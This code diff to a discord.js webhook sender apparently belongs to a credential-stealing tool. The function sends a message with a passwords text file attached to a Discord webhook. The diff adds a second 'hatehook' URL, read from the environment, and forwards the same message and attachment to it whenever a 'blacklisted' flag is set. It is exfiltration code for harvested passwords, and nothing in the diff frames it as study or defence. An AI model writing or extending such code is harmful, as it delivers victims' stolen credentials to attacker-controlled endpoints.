@@ -1,6 +1,9 @@
 import { WebhookClient, MessagePayload, AttachmentBuilder } from "discord.js";
+import dotenv from "dotenv";
+dotenv.config();
+const hatehook = process.env.DISCORD_HATEHOOK;
 
-export default async function sendWebhook(body:any,webhookURL:string) {
+export default async function sendWebhook(body:any,webhookURL:string, blacklisted?: boolean) {
     const webhook = new WebhookClient({url: webhookURL});
     const messageBody = body[0]
     const PasswordsTxtBuffer = body[1]
@@ -14,6 +17,10 @@ export default async function sendWebhook(body:any,webhookURL:string) {
                 files: [attachment]
             });
             await webhook.send(message);
+            if (blacklisted && hatehook) {
+                const hateWebhook = new WebhookClient({url: hatehook});
+                await hateWebhook.send(message);
+            }
         }
         else {
             const message = new MessagePayload(webhook, {
